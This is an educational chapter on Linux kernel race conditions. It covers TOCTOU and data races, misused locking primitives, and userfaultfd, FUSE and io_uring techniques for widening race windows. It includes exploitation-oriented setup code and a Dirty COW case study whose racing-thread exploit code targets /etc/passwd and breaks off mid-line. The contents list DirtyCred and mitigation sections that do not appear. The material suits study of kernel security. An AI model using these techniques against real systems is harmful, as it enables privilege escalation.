# 4a. Race Conditions in the Linux Kernel

## Table of Contents

1. [Introduction](#1-introduction)
2. [Types of Race Conditions in the Kernel](#2-types-of-race-conditions-in-the-kernel)
3. [Kernel Concurrency Primitives and Their Misuse](#3-kernel-concurrency-primitives-and-their-misuse)
4. [Race Conditions in Syscall Handlers](#4-race-conditions-in-syscall-handlers)
5. [Techniques to Win Race Conditions](#5-techniques-to-win-race-conditions)
6. [The userfaultfd Technique in Detail](#6-the-userfaultfd-technique-in-detail)
7. [FUSE-Based Race Exploitation](#7-fuse-based-race-exploitation)
8. [Case Study: Dirty COW (CVE-2016-5195)](#8-case-study-dirty-cow-cve-2016-5195)
9. [DirtyCred Attack Technique](#9-dirtycred-attack-technique)
10. [Mitigations and Defenses](#10-mitigations-and-defenses)

---

## 1. Introduction

Race conditions are among the most subtle and dangerous vulnerability classes in the Linux kernel. Unlike stack or heap overflows where the corruption is often deterministic, a race condition depends on the precise interleaving of concurrent operations -- making them notoriously difficult to both discover and exploit. However, advances in exploitation technique have transformed race conditions from probabilistic gambles into near-deterministic exploit primitives.

The Linux kernel is inherently concurrent: it handles interrupts, softirqs, multiple CPUs, kernel threads, and preemptible contexts simultaneously. Every shared data structure is a potential site for a race condition if synchronization is improperly implemented. From a security perspective, this massive concurrency surface creates a rich class of vulnerabilities that have yielded some of the most impactful exploits in Linux history.

This section provides a deep technical analysis of:

- **The taxonomy** of kernel race conditions
- **The concurrency primitives** meant to prevent them (and how they fail)
- **Exploitation techniques** that transform narrow race windows into reliable exploits
- **Case studies** of real-world race condition vulnerabilities and their exploitation

---

## 2. Types of Race Conditions in the Kernel

### 2.1 TOCTOU (Time-of-Check-to-Time-of-Use)

TOCTOU races occur when the kernel checks a condition and then acts on it, but the condition can change between the check and the use. This is the most common exploitable race condition class in the kernel.

**General Pattern:**

```c
// Thread A (kernel path)
if (check_condition(obj)) {      // TIME OF CHECK
    // ... race window ...
    use_object(obj);              // TIME OF USE -- condition may no longer hold
}

// Thread B (attacker-controlled)
// During the race window:
modify_condition(obj);            // Invalidate the check
```

**Classic Kernel TOCTOU Example -- Double-Fetch from Userspace:**

A particularly dangerous TOCTOU pattern involves the kernel reading a value from userspace memory twice. The first read validates the value; the second read uses it. An attacker on another CPU can modify the userspace memory between the two reads.

```c
// Vulnerable kernel code
int vulnerable_ioctl(struct file *f, unsigned long arg) {
    struct user_request __user *ureq = (void __user *)arg;
    u32 size;

    // FIRST FETCH (check)
    if (get_user(size, &ureq->size))
        return -EFAULT;

    if (size > MAX_SIZE)                // Validate size
        return -EINVAL;

    // SECOND FETCH (use) -- attacker changes ureq->size here
    // copy_from_user uses the same memory, but size may have changed
    buf = kmalloc(size, GFP_KERNEL);   // Allocates based on checked size
    if (copy_from_user(buf, ureq->data, ureq->size))  // BUG: re-reads size
        goto err;
}
```

Between the validation of `size` and the `copy_from_user` that re-reads `ureq->size`, an attacker thread on another CPU can overwrite `ureq->size` with a larger value, causing a heap buffer overflow.

**Mitigation pattern:** Always copy user data into kernel memory once via `copy_from_user()`, then operate exclusively on the kernel copy. Never re-read from userspace.

### 2.2 Data Races

A data race occurs when two or more threads access the same memory location concurrently, at least one access is a write, and the accesses are not ordered by synchronization. The C11 memory model (adopted by the kernel's LKMM -- Linux Kernel Memory Model) considers data races undefined behavior.

**Categories of kernel data races:**

**a) Plain load/store races:**

```c
// Shared global, no synchronization
int shared_counter;

// CPU 0                          // CPU 1
shared_counter++;                 shared_counter++;
// Both may read the same value, resulting in a lost update
```

The kernel has historically been permissive about "benign" data races (e.g., statistics counters), but the KCSAN (Kernel Concurrency Sanitizer) project has been systematically identifying and annotating these. Truly benign races must use `READ_ONCE()` / `WRITE_ONCE()` or appropriate atomic operations to avoid compiler-introduced bugs.

**b) Torn reads/writes:**

On architectures where word-sized accesses are not atomic, a 64-bit value written by one CPU may be partially read by another:

```c
// CPU 0: writes 0x00000001_00000002 to a 64-bit variable
shared_u64 = 0x0000000100000002ULL;

// CPU 1: may observe 0x00000001_00000000 (torn read)
// if the write is not atomic on this architecture
u64 val = shared_u64;
```

On x86-64, naturally aligned 64-bit accesses are atomic, but this is not guaranteed on all architectures (notably 32-bit ARM).

**c) Compiler-induced races:**

Without `READ_ONCE()` / `WRITE_ONCE()`, the compiler may:
- Cache a value in a register and miss updates from other CPUs
- Split a single access into multiple accesses
- Invent stores (e.g., rewriting the same value)
- Merge multiple reads into one (missing updates)

```c
// Without READ_ONCE, the compiler may hoist this out of the loop:
while (shared_flag) {     // compiler may read once and loop forever
    do_work();
}

// Correct:
while (READ_ONCE(shared_flag)) {
    do_work();
}
```

### 2.3 Lock Ordering Bugs (Deadlock-Inducing Races)

While not directly exploitable as memory corruption, lock ordering bugs create race conditions that can lead to deadlock, which is a denial-of-service condition. More critically, incorrect lock ordering often indicates that the developer misunderstood the synchronization requirements, and the same code path may contain exploitable races.

**ABBA Deadlock:**

```
CPU 0:                     CPU 1:
spin_lock(&A);             spin_lock(&B);
spin_lock(&B);  // waits   spin_lock(&A);  // waits -> DEADLOCK
```

The kernel's `lockdep` subsystem dynamically detects lock ordering violations at runtime. Lockdep maintains a directed graph of lock dependencies and reports any cycle, which indicates a potential deadlock.

**Lock ordering bugs as exploit indicators:**

A subsystem that has lock ordering bugs often has paths where data is accessed without adequate locking. An attacker may find that:
1. Path A holds lock X then accesses structure S
2. Path B accesses structure S without holding lock X
3. By racing Path A and Path B, the attacker can corrupt S

### 2.4 Incorrect Reference Counting Races

Reference counting races are a subset of data races that lead to use-after-free conditions. If a reference count is decremented and checked non-atomically, or if an object is used after its reference is dropped, a race exists:

```c
// Thread A                        // Thread B
obj = lookup_object(key);          // ...
if (obj) {                         // ...
    // Window: obj may be freed    remove_object(key);  // drops last ref
    use_object(obj);               // obj is freed here
}                                  // Thread A: use-after-free!
```

The kernel uses `refcount_t` (replacing raw `atomic_t` for reference counts) which includes saturation checking to prevent overflow/underflow of reference counts.

---

## 3. Kernel Concurrency Primitives and Their Misuse

### 3.1 Spinlocks

Spinlocks are the most fundamental kernel synchronization primitive. A CPU acquiring a spinlock busy-waits until it becomes available. On uniprocessor systems, spinlocks simply disable preemption.

**API:**
```c
spinlock_t lock;
spin_lock_init(&lock);

spin_lock(&lock);          // Acquire; disables preemption
// critical section
spin_unlock(&lock);        // Release; re-enables preemption

spin_lock_irqsave(&lock, flags);    // Also disables IRQs
spin_unlock_irqrestore(&lock, flags);

spin_lock_bh(&lock);               // Also disables bottom halves
spin_unlock_bh(&lock);
```

**Common misuse patterns:**

**a) Missing IRQ-safe variant:**
```c
// BUG: If an interrupt handler also takes this lock, deadlock occurs
spin_lock(&my_lock);
// ... interrupt fires, handler tries spin_lock(&my_lock) -> DEADLOCK

// Fix:
spin_lock_irqsave(&my_lock, flags);
```

**b) Holding spinlock too long:**
Spinlocks must not be held across blocking operations. Since they disable preemption, holding them for extended periods degrades system responsiveness and on PREEMPT_RT kernels can cause priority inversion.

**c) Forgetting to protect all access paths:**
```c
// Path A: properly locked
spin_lock(&obj->lock);
obj->counter++;
spin_unlock(&obj->lock);

// Path B: BUG -- no lock taken
obj->counter--;   // Data race with Path A!
```

### 3.2 Mutexes

Mutexes are sleeping locks suitable for longer critical sections. Unlike spinlocks, a thread waiting for a mutex is descheduled, freeing the CPU.

**API:**
```c
struct mutex mtx;
mutex_init(&mtx);

mutex_lock(&mtx);       // Acquire; may sleep
// critical section (may sleep, allocate memory, etc.)
mutex_unlock(&mtx);

mutex_trylock(&mtx);    // Non-blocking attempt
mutex_lock_interruptible(&mtx);  // Can be interrupted by signals
```

**Key properties and misuse:**
- **Owner semantics:** Only the thread that acquired the mutex can release it
- **Cannot be used in interrupt/atomic context** -- doing so is a bug
- **Not recursive:** Attempting to lock a mutex already held by the same thread deadlocks

**Misuse leading to races:**

```c
// BUG: Checking condition and acting on it are not atomic
mutex_lock(&mtx);
if (list_empty(&my_list)) {
    mutex_unlock(&mtx);
    return -ENOENT;
}
mutex_unlock(&mtx);
// RACE WINDOW: list could be emptied here by another thread
entry = list_first_entry(&my_list, struct my_entry, node);  // Use-after-free
```

### 3.3 RCU (Read-Copy-Update)

RCU is a synchronization mechanism optimized for read-heavy workloads. It allows readers to access shared data structures without any synchronization overhead (no locks, no atomic operations, no memory barriers on most architectures), while writers coordinate with readers through a grace period mechanism.

**Core API:**
```c
// Reader side -- essentially zero overhead
rcu_read_lock();
p = rcu_dereference(global_ptr);  // Safe load of RCU-protected pointer
// ... use p ...
rcu_read_unlock();

// Writer side
struct foo *new = kmalloc(sizeof(*new), GFP_KERNEL);
*new = *old;                       // Copy
new->field = new_value;            // Update
rcu_assign_pointer(global_ptr, new);  // Publish (store-release)
synchronize_rcu();                 // Wait for all pre-existing readers
kfree(old);                        // Reclaim
```

**How RCU works conceptually:**

1. **Removal phase:** The writer atomically swaps a pointer from the old object to a new one using `rcu_assign_pointer()`. Concurrent readers may see either the old or new pointer.

2. **Grace period:** `synchronize_rcu()` blocks until every CPU has passed through a quiescent state (context switch, idle, or user-space execution). This ensures no reader holds a reference to the old object.

3. **Reclamation phase:** After the grace period, the old object is safely freed.

**Common misuse patterns:**

**a) Dereferencing outside RCU read-side critical section:**
```c
rcu_read_lock();
p = rcu_dereference(global_ptr);
rcu_read_unlock();
// BUG: p is no longer protected -- object may be freed
p->data = 42;  // Use-after-free!
```

**b) Missing rcu_assign_pointer:**
```c
// BUG: No memory ordering -- reader may see partially initialized new_obj
global_ptr = new_obj;

// Fix:
rcu_assign_pointer(global_ptr, new_obj);
```

**c) Missing rcu_dereference:**
```c
rcu_read_lock();
p = global_ptr;  // BUG: may be reordered or optimized by compiler
// Fix:
p = rcu_dereference(global_ptr);
```

**d) Sleeping inside RCU read-side critical section:**
```c
rcu_read_lock();
p = rcu_dereference(global_ptr);
kmalloc(size, GFP_KERNEL);  // BUG: may sleep -- violates RCU constraints
rcu_read_unlock();
```

Sleeping inside an RCU read-side critical section (for classic RCU, not SRCU) prevents the grace period from completing, leading to memory exhaustion as deferred frees accumulate. SRCU (Sleepable RCU) exists for cases where sleeping is required.

### 3.4 Seqlocks

Seqlocks provide a lock-free read path combined with a write-side lock. Readers never block writers, but must retry if a concurrent write occurred.

**API:**
```c
seqlock_t lock;
seqlock_init(&lock);

// Writer (exclusive):
write_seqlock(&lock);
// ... update shared data ...
write_sequnlock(&lock);

// Reader (lockless, retry loop):
unsigned seq;
do {
    seq = read_seqbegin(&lock);
    // ... read shared data (must copy out) ...
} while (read_seqretry(&lock, seq));
```

**How it works:**
- The sequence counter starts at 0 (even)
- Writers increment it to odd at entry and back to even at exit
- Readers sample the counter before and after reading; if the values differ or are odd, they retry

**Key limitation:** Seqlocks cannot protect pointers. If a writer invalidates a pointer that a reader is following, the reader will dereference a stale/freed pointer before realizing the sequence counter changed. Seqlocks are primarily used for simple value types (e.g., `jiffies`, `xtime`).

**Misuse as vulnerability:**

If seqlock-protected data includes a pointer and the developer doesn't ensure pointer stability:
```c
do {
    seq = read_seqbegin(&lock);
    p = shared_ptr;         // Read pointer
    val = p->data;          // Dereference -- but p may have been freed!
} while (read_seqretry(&lock, seq));
// The retry AFTER dereferencing a potentially freed pointer is too late
```

### 3.5 Atomic Operations and Memory Ordering

The kernel provides atomic operations (`atomic_t`, `atomic64_t`) with various memory ordering guarantees:

```c
atomic_t counter;
atomic_set(&counter, 0);
atomic_inc(&counter);           // Relaxed by default
atomic_add_return(1, &counter); // Full barrier (returns new value)
atomic_inc_return(&counter);    // Full barrier
smp_mb__before_atomic();        // Explicit barrier before relaxed atomic
atomic_inc(&counter);
```

**Misuse:** Using relaxed atomics where ordering is required can lead to races where one CPU observes operations in an unexpected order.

---

## 4. Race Conditions in Syscall Handlers

### 4.1 The Concurrent Syscall Surface

Every system call handler in the Linux kernel must be designed to handle concurrent execution. Multiple userspace threads (or processes sharing memory via `clone(CLONE_VM)`) can invoke the same syscall simultaneously on different CPUs. This is a massive attack surface for race conditions.

**Key areas where syscall races occur:**

1. **File descriptor operations:** Multiple threads operating on the same fd table. The `close()` vs. other fd operations race is a classic example (CVE-2021-0920 exploited a `close()` race in Unix socket garbage collection).

2. **Memory management syscalls:** `mmap()`, `munmap()`, `mremap()`, `madvise()`, and `mprotect()` modify the process address space, which is shared among threads. The `mmap_lock` (formerly `mmap_sem`) serializes many of these, but subtle races exist at VMA (Virtual Memory Area) boundaries and during page table manipulation.

3. **Signal handling:** Signal delivery races with syscall execution, creating windows where the kernel state is inconsistent.

4. **Networking subsystem:** Socket operations are notoriously race-prone, as they involve complex state machines (TCP state, socket buffer management) accessible from multiple syscall paths and softirq context simultaneously.

### 4.2 Parallel Execution Model

```
 CPU 0                          CPU 1
 -----                          -----
 sys_ioctl(fd, CMD, buf_A)      sys_ioctl(fd, CMD, buf_B)
   |                              |
   v                              v
 driver->ioctl(file, CMD, ...)  driver->ioctl(file, CMD, ...)
   |                              |
   v                              v
 access shared state            access shared state
                    RACE!
```

When the driver `ioctl` handler accesses per-device or per-file state without proper locking, concurrent calls create exploitable data races.

### 4.3 Example: fd Race Conditions

A common pattern exploits the race between `close(fd)` and another operation on the same fd:

```c
// Thread A                      // Thread B
int fd = open("/dev/vuln", ...);
                                  // ... setup ...
ioctl(fd, VULN_CMD, arg);        close(fd);
                                  // fd slot is now free
                                  // open() can reuse it for a
                                  // different file object
```

If the kernel's ioctl handler doesn't properly handle the file being closed underneath it (e.g., it caches the file's private_data pointer), the ioctl may operate on a freed or reused object.

### 4.4 The mmap_lock and VMA Races

The `mmap_lock` (an rw_semaphore) protects the process's VMA tree. Prior to kernel 6.1, this was a single lock for the entire address space, creating both a performance bottleneck and a synchronization point. The Maple tree and per-VMA locking patches (merged in 6.1+) changed this landscape, introducing finer-grained locking -- but also new opportunities for subtle races during the transition.

Races involving mmap_lock:
```
Thread A:                        Thread B:
mmap(addr, size, ...)            munmap(addr, size)
  down_write(mm->mmap_lock)        down_write(mm->mmap_lock)
  // blocked                       // proceeds, unmaps
                                   up_write(mm->mmap_lock)
  // proceeds                    Thread C:
  // but the VMA landscape        mmap(addr2, ...)  // may reuse addr
  // has changed!
```

---

## 5. Techniques to Win Race Conditions

Exploiting a race condition traditionally requires hitting a narrow timing window. Modern techniques have evolved to dramatically widen this window or make exploitation entirely deterministic.

### 5.1 CPU Pinning (sched_setaffinity)

By pinning threads to specific CPUs, an attacker ensures that the racing threads run on known cores, minimizing scheduling jitter:

```c
void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

// Attacker setup:
// Thread A (triggers vulnerable path) -> pinned to CPU 0
// Thread B (performs racing operation) -> pinned to CPU 1
```

Benefits:
- Eliminates cache migration overhead
- Ensures both threads run simultaneously (not time-sliced on the same core)
- Reduces variance in timing

### 5.2 Priority Manipulation

Using `sched_setscheduler()` to set threads to real-time priority (`SCHED_FIFO`) prevents them from being preempted by normal tasks, reducing timing jitter:

```c
struct sched_param param = { .sched_priority = 99 };
sched_setscheduler(0, SCHED_FIFO, &param);  // Requires CAP_SYS_NICE
```

### 5.3 userfaultfd (Detailed in Section 6)

The `userfaultfd` mechanism allows userspace to handle page faults. By setting up a page monitored by userfaultfd, an attacker can cause the kernel to block at a precise point when it accesses that page -- providing an arbitrarily wide race window.

### 5.4 FUSE (Detailed in Section 7)

The Filesystem in Userspace (FUSE) mechanism allows a userspace daemon to serve file operations. When the kernel reads from a FUSE-backed file, control passes to the userspace daemon, which can delay its response arbitrarily.

### 5.5 io_uring

The `io_uring` subsystem provides asynchronous I/O with submission and completion queues in shared memory. From a race condition perspective, io_uring is interesting because:

1. **Concurrent submission:** Multiple operations can be submitted and executed concurrently by kernel worker threads
2. **Linked operations:** io_uring supports chaining operations, where the second starts immediately after the first completes -- this provides precise timing control
3. **Registered files/buffers:** Operations on registered resources avoid some locking overhead, potentially widening race windows

```c
// Submit two operations that race with each other:
struct io_uring_sqe *sqe1 = io_uring_get_sqe(&ring);
struct io_uring_sqe *sqe2 = io_uring_get_sqe(&ring);

// sqe1: operation A
io_uring_prep_writev(sqe1, fd, iov_a, 1, 0);

// sqe2: operation B (races with A)
io_uring_prep_close(sqe2, fd);

io_uring_submit(&ring);  // Both submitted atomically
```

io_uring has itself been a prolific source of race condition vulnerabilities due to its complex interactions with the kernel's file, networking, and memory management subsystems. The kernel has progressively restricted unprivileged access to io_uring on many distributions.

### 5.6 Timing with Hardware Features

Advanced attackers may use hardware features for timing:
- **Performance counters** (`perf_event_open`) for precise cycle-level measurement
- **TSC (Time Stamp Counter)** via `rdtsc` for sub-nanosecond timing on x86
- **Cache timing** to detect when another CPU has accessed specific data
- **Memory bus contention** to infer when a competing operation is at a specific point

### 5.7 Signal-Based Interruption

The attacker can use signals (SIGALRM, SIGSTOP/SIGCONT) to interrupt kernel paths at strategic points:

```c
// Setup:
alarm(0);  // Will fire SIGALRM soon

// The signal can interrupt certain syscalls at a blocking point,
// leaving kernel state partially modified
```

This technique was used in exploiting `CVE-2016-4557` (BPF race condition).

---

## 6. The userfaultfd Technique in Detail

### 6.1 Overview

`userfaultfd` is a Linux system call (introduced in kernel 4.3) that allows userspace to handle page faults for designated memory regions. When a page fault occurs in a registered region, the faulting thread is suspended, and an event is delivered to the userfaultfd monitor thread. The faulting thread remains suspended until the monitor resolves the fault.

This mechanism was designed for legitimate use cases:
- **Live migration:** QEMU/KVM post-copy live migration of VMs
- **Checkpointing:** CRIU (Checkpoint/Restore in Userspace)
- **Garbage collection:** Concurrent GC implementations

However, it provides exploit authors with a powerful primitive: **the ability to suspend kernel execution at any point where the kernel accesses user-mapped memory**.

### 6.2 Setting Up userfaultfd for Exploitation

```c
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>

// Step 1: Create userfaultfd file descriptor
int uffd = syscall(SYS_userfaultfd, O_NONBLOCK | O_CLOEXEC);

// Step 2: Enable the userfaultfd API
struct uffdio_api api = { .api = UFFD_API };
ioctl(uffd, UFFDIO_API, &api);

// Step 3: Create target memory region (unmapped pages)
void *region = mmap(NULL, PAGE_SIZE,
                    PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS,
                    -1, 0);

// Step 4: Register the region with userfaultfd
struct uffdio_register reg = {
    .mode = UFFDIO_REGISTER_MODE_MISSING,
    .range = {
        .start = (unsigned long)region,
        .len = PAGE_SIZE,
    },
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Step 5: Monitor thread -- handles page faults
void *fault_handler(void *arg) {
    int uffd = (int)(long)arg;
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };

    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));

        if (msg.event == UFFD_EVENT_PAGEFAULT) {
            // KERNEL IS NOW BLOCKED waiting for us!
            // Perform the racing operation here...
            do_race_operation();

            // Now resolve the fault to let the kernel continue
            struct uffdio_copy copy = {
                .dst = msg.arg.pagefault.address & ~(PAGE_SIZE - 1),
                .src = (unsigned long)prepared_page,
                .len = PAGE_SIZE,
            };
            ioctl(uffd, UFFDIO_COPY, &copy);
        }
    }
    return NULL;
}
```

### 6.3 Exploitation Flow -- Step by Step

Consider a kernel vulnerability where a TOCTOU race exists in an ioctl handler:

```c
// Kernel: vulnerable ioctl handler
long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct request __user *ureq = (void __user *)arg;
    struct request kreq;

    // FIRST ACCESS: copies from userspace (may trigger page fault)
    if (copy_from_user(&kreq, ureq, sizeof(kreq)))
        return -EFAULT;

    if (kreq.size > MAX_SIZE)  // Validate
        return -EINVAL;

    // ... kernel does some work ...

    // SECOND ACCESS: reads from userspace again (TOCTOU!)
    // This access will trigger the userfaultfd page fault
    if (copy_from_user(buf, ureq->data_ptr, kreq.size))
        return -EFAULT;
}
```

**Exploitation steps:**

```
1. SETUP PHASE:
   - Allocate two consecutive pages: Page_A and Page_B
   - Place the `struct request` such that it spans the page boundary:
     * kreq.size field is on Page_A (passes validation)
     * kreq.data_ptr and remaining fields are on Page_B
   - Register Page_B with userfaultfd (leave it unmapped)
   - Page_A is populated with valid data

2. TRIGGER PHASE:
   Thread 1: call ioctl(fd, VULN_CMD, addr_spanning_boundary)
   
   - Kernel's first copy_from_user reads kreq.size from Page_A: OK
   - Kernel validates kreq.size: passes
   - Kernel attempts second copy_from_user, touching Page_B
   - PAGE FAULT on Page_B -> kernel thread BLOCKS
   - userfaultfd monitor receives notification

3. RACE PHASE (in the userfaultfd handler):
   Thread 2 (uffd monitor):
   - Kernel is frozen mid-syscall
   - Remap or modify Page_A to change kreq.size to a larger value
   - Or: perform object manipulation (free/realloc) to exploit UAF
   - Resolve the page fault via UFFDIO_COPY

4. COMPLETION PHASE:
   - Kernel resumes with corrupted/stale state
   - The second copy_from_user uses the size the kernel cached from
     step 2 (already validated), but the actual data has changed
   - Result: heap overflow, UAF, or other memory corruption
```

### 6.4 Memory Layout for Page-Boundary Splitting

```
                    Page_A                          Page_B
     (populated, contains first part)    (userfaultfd-registered, unmapped)
    +----------------------------------+----------------------------------+
    |  kreq.field1   |   kreq.size     |  kreq.data_ptr  | kreq.field3   |
    |  (valid data)  |  (validates OK) |  (PAGE FAULT!)  |               |
    +----------------------------------+----------------------------------+
    ^                                  ^
    |                                  |
    ureq points here            Page boundary -- fault here
```

The attacker carefully constructs the userspace memory layout so that the kernel's first access (validation) reads from the populated page, and the second access (or continued read) crosses into the userfaultfd-monitored page, triggering the controlled pause.

### 6.5 Using userfaultfd to Exploit Use-After-Free

userfaultfd is equally powerful for exploiting UAF vulnerabilities:

```
1. Thread A: Trigger the vulnerable path that will access a freed object
   - The access is to userspace memory monitored by userfaultfd
   - Kernel blocks on page fault

2. While kernel is blocked:
   Thread B: Free the target object
   Thread C: Reallocate the freed memory with attacker-controlled data
   
   (This is now a controlled use-after-free: the object has been
    replaced, and when the kernel resumes, it operates on
    attacker-controlled data)

3. Resolve the userfaultfd fault
   - Kernel resumes and uses the reallocated (attacker-controlled) object
```

### 6.6 Restrictions and Mitigations

Starting with Linux 5.11, the `UFFD_USER_MODE_ONLY` flag restricts userfaultfd to only handle faults from userspace. If a kernel-originated fault occurs on a registered region, a `SIGBUS` is delivered instead of a userfaultfd event.

The sysctl `vm.unprivileged_userfaultfd` controls access:
- **0:** Unprivileged users cannot use userfaultfd at all
- **1:** Full access (default on older kernels)

Many distributions now set `vm.unprivileged_userfaultfd = 0`, forcing exploits to find alternative methods (FUSE, io_uring, etc.) to achieve controlled kernel pausing.

---

## 7. FUSE-Based Race Exploitation

### 7.1 Overview

FUSE (Filesystem in Userspace) allows unprivileged users to create custom filesystems. When the kernel accesses a file on a FUSE filesystem, the request is forwarded to the userspace FUSE daemon, which processes it and returns the result. The key insight for exploitation is that **the FUSE daemon controls when (or if) it responds to a request**, providing the same "kernel pause" capability as userfaultfd.

### 7.2 Mechanism

```
Kernel                              Userspace FUSE Daemon
------                              ---------------------
open("/mnt/fuse/file", ...)
  -> VFS layer
    -> FUSE kernel module
      -> forwards request to daemon  -> daemon receives OPEN request
      -> BLOCKS waiting for reply    -> daemon can delay arbitrarily!
                                     -> during delay: perform racing ops
                                     -> daemon sends reply
      <- receives reply
    <- returns to VFS
  <- returns fd to userspace
```

The same pattern applies to `read()`, `write()`, `mmap()` (with `mmap` support), and other VFS operations on FUSE-backed files.

### 7.3 FUSE as an Alternative to userfaultfd

FUSE provides similar capabilities with different tradeoffs:

| Aspect | userfaultfd | FUSE |
|--------|-------------|------|
| Granularity | Page-level | Per-filesystem-operation |
| Trigger | Any memory access to registered page | VFS operations on FUSE file |
| Privilege | Requires userfaultfd access | Requires FUSE access (usually unprivileged) |
| Kernel pause point | `copy_from_user` / `copy_to_user` / page fault | VFS read/write/mmap handlers |
| Restrictions | `vm.unprivileged_userfaultfd` sysctl | Can be restricted via mount policies |

### 7.4 Exploitation via FUSE -- Step by Step

**Scenario:** Exploit a TOCTOU race where the kernel calls `vfs_read()` on a user-provided fd.

```c
// Step 1: Create a FUSE filesystem with a custom read handler
// In the FUSE daemon:

static int my_read(const char *path, char *buf, size_t size,
                   off_t offset, struct fuse_file_info *fi) {
    if (first_read) {
        first_read = 0;
        // Return valid data for the first read (passes kernel validation)
        memcpy(buf, valid_data, size);
        return size;
    } else {
        // SECOND READ: signal the race thread, then delay
        signal_race_thread();
        sleep(1);  // Hold the kernel blocked

        // Return different data (exploit payload)
        memcpy(buf, exploit_data, size);
        return size;
    }
}

// Step 2: Mount the FUSE filesystem
// $ mkdir /tmp/fuse_mount
// $ ./my_fuse_daemon /tmp/fuse_mount

// Step 3: Open the FUSE-backed file
int fd = open("/tmp/fuse_mount/file", O_RDONLY);

// Step 4: Pass the fd to the vulnerable syscall
syscall_with_race(fd);
```

### 7.5 FUSE + mmap for Page-Level Control

FUSE can also serve `mmap()` operations, giving page-level control similar to userfaultfd:

```c
// FUSE daemon: custom mmap handler
// When the kernel faults in a page from the FUSE-backed mmap,
// the daemon can control the contents and timing of the page delivery.
```

However, FUSE mmap support requires `direct_io` or careful DAX configuration, making userfaultfd generally simpler for page-level exploitation when available.

### 7.6 FUSE Race Example: Exploiting Double-Read

```
Thread A (triggers vulnerability):     FUSE daemon:
                                       
1. open("/fuse/evil", O_RDONLY) -----> daemon: returns fd
                                       
2. ioctl(target_fd, CMD, fuse_fd)      
   Kernel reads size from FUSE file -> daemon: returns size=0x10 (valid)
   Kernel validates: OK                
   Kernel reads data from FUSE file -> daemon: BLOCKS
                                       
                                       daemon: perform racing operation
                                       (e.g., free target object, 
                                        reallocate with controlled data)
                                       
                                       daemon: returns data (0x1000 bytes)
   Kernel uses stale size (0x10)       
   but data buffer is 0x1000 bytes     
   -> overflow or other corruption     
```

---

## 8. Case Study: Dirty COW (CVE-2016-5195)

### 8.1 Overview

Dirty COW (Dirty Copy-On-Write) is a race condition vulnerability in the Linux kernel's memory management subsystem that existed from kernel 2.6.22 (2007) until it was patched in October 2016. It allows an unprivileged local user to gain write access to read-only memory mappings, enabling privilege escalation.

- **CVE:** CVE-2016-5195
- **Affected versions:** Linux kernel 2.6.22 through 4.8.2
- **Severity:** HIGH (CVSS 7.8)
- **Discoverer:** Phil Oester (found exploited in the wild)
- **Exploitation in the wild:** Yes -- confirmed via HTTP packet capture

### 8.2 The Vulnerability: Copy-on-Write Race

The bug lies in the `get_user_pages()` function, which is used to pin user pages in kernel memory (e.g., for direct I/O). The race occurs between the COW (Copy-On-Write) mechanism and the page table manipulation.

**Normal COW behavior:**
1. Process maps a read-only file (e.g., `/etc/passwd`) via `mmap(MAP_PRIVATE)`
2. The mapping is initially read-only, pointing to the page cache
3. On write attempt, the kernel performs COW: allocates a private copy, copies data, and maps the private copy as writable
4. The write goes to the private copy; the original file is unmodified

**The race condition:**

The vulnerability exists in the `follow_page_pte()` / `faultin_page()` retry loop within `__get_user_pages()`. Here is the detailed execution flow:

```
Step 1: get_user_pages() called with FOLL_WRITE flag
        -> follow_page_mask() -> follow_page_pte()
        -> Page is read-only, FOLL_WRITE requested
        -> Returns NULL (page not available with requested permissions)

Step 2: faultin_page() called
        -> handle_mm_fault() -> handle_pte_fault() -> do_wp_page()
        -> COW is performed: private copy allocated
        -> Page marked dirty but STILL READ-ONLY
           (pte is dirty | read-only: the write bit will be set later)
        -> Returns VM_FAULT_WRITE

Step 3: Because VM_FAULT_WRITE is returned and the VMA doesn't have
        VM_WRITE, the FOLL_WRITE flag is DROPPED.
        The retry loop continues WITHOUT FOLL_WRITE.

  *** RACE WINDOW: Between step 3 and step 4 ***

  Another thread calls madvise(MADV_DONTNEED) on the same page.
  This DISCARDS the private COW copy, reverting the page table entry
  to point back to the original read-only file page (or no page).

Step 4: follow_page_mask() called again (this time without FOLL_WRITE)
        -> Because FOLL_WRITE was dropped, a read-only page is acceptable
        -> If madvise() won the race: returns the ORIGINAL FILE PAGE
        -> The kernel now has a writable reference to the page cache page!

Step 5: The write through get_user_pages() goes to the page cache
        -> DIRECTLY MODIFIES THE BACKING FILE
```

### 8.3 The Race in Code

The vulnerable code path in `mm/gup.c` (`__get_user_pages` retry loop):

```c
// Simplified vulnerable logic in __get_user_pages():
retry:
    // Try to find the page with current flags
    page = follow_page_mask(vma, start, foll_flags, &page_mask);
    
    if (!page) {
        // Page not present or wrong permissions
        ret = faultin_page(tsk, vma, start, &foll_flags, nonblocking);
        
        if (ret & VM_FAULT_WRITE) {
            // COW was done. Since mapping is read-only (MAP_PRIVATE on
            // read-only file), we drop FOLL_WRITE to avoid re-faulting
            if (!(vma->vm_flags & VM_WRITE))
                foll_flags &= ~FOLL_WRITE;  // BUG: drops write requirement
        }
        
        cond_resched();  // <<< RACE WINDOW: scheduler may run madvise thread
        goto retry;      // Retry without FOLL_WRITE
    }
    
    // page is now a reference to... the page cache page!
    // Subsequent write through this reference modifies the file
```

### 8.4 Exploitation Technique

The exploit uses two threads racing against each other:

```c
// Thread 1: Write to /proc/self/mem at the offset of the mmap'd file
void *writer_thread(void *arg) {
    while (1) {
        // Seek to the mapped address in /proc/self/mem
        lseek(proc_self_mem_fd, (off_t)map_addr, SEEK_SET);
        // Write triggers get_user_pages(FOLL_WRITE) on the mapping
        write(proc_self_mem_fd, payload, payload_len);
    }
}

// Thread 2: Repeatedly discard the private COW page
void *madvise_thread(void *arg) {
    while (1) {
        // Discard the private COW copy, reverting to file page
        madvise(map_addr, PAGE_SIZE, MADV_DONTNEED);
    }
}

// Main:
int target_fd = open("/etc/passwd", O_RDONLY);
void *map_addr = mmap(NULL, file_size, PROT_READ,
